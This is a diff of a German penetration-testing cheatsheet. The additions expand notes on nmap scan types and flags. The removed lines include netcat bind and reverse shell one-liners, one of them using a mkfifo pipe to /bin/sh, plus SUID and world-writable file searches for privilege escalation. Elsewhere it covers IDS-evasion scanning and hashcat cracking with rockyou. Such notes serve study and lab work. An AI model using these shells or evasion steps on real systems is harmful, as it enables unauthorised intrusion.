@@ -1,5 +1,3 @@
-# Kali Cheatsheet
-
 # Information Gathering
 
 ---
@@ -16,13 +14,21 @@ nmap -A 127.0.0.1 -v
 
 (Erzeugt sehr viel Traffic)
 
-SYN:
+TCP Scan:
+
+```bash
+nmap -sT 127.0.0.1 -v
+```
+
+(Normaler TCP scan -> Verbindung wird nach 3-way handshake beendet (Dadurch erkennbar))
+
+SYN (Standard nmap scan):
 
 ```bash
 nmap -sS -F 127.0.0.1 -v
 ```
 
-(Schnell aber nicht umbedingt präzise dafür unwahrscheinlicher geloggt zu werden)
+(Schnell aber nicht umbedingt präzise dafür unwahrscheinlicher geloggt zu werden -> Verbindung wird während 3-way handshake beendet)
 
 ACK:
 
@@ -37,6 +43,8 @@ UDP:
 ```bash
 nmap -sU -F 127.0.0.1 -v
 ```
+
+(Aufgrund von keiner Antwort vom Server kann der Scan nur rausfinden ob der Port offen ist oder ob der Port von der Firewall geblockt wird) -> Dauert recht lange also nicht so optimal
 
 Firewall erkennen:
 
@@ -54,6 +62,15 @@ IDS umgehen:
 
 ```
 nmap -T2 -f 127.0.0.1
+```
+
+Nmap flaggs:
+```bash
+-F # Fast Mode (scannt 100 most common ports)
+-p- # Alle ports
+-r # Scannt die ports in "consecutive order"
+-T<0-5> # Geschwindigkeit beim port scannen
+--min-parallelism=64 # Wie viele Instanzen gleichzeitig laufen
 ```
 
 ### Gobuster
@@ -150,39 +167,5 @@ SHA256
 ```bash
 hashcat -a 0 -w 4 -m 1400 --session hash_session hash.hash /usr/share/wordlists/rockyou.txt
 ```
-## Netcat
 
-Listening shell:
-```bash
-nc -lvnp 4000
-```
-
-Ohne -e:
-```bash
-rm -f /tmp/f; mkfifo /tmp/f
-cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
-```
-
-Reverse shell:
-```bash
-nc -e "/bin/bash" ip port
-```
-Ohne -e
-```bash
-nc host.example.com 1234
-(shell prompt from host.example.com)
-```
-
-# Privilege Escalation
-
----
-
-Datei mit SUID bit gesetzt:
-```bash
-find / -user root -perm -4000 -print 2>/dev/null | head -20
-```
-
-Falsch konfigurierte Dateiattribute:
-```bash
-find / -type f -perm 0777
-```
+![grafik.png](.attachments.12925/grafik.png)
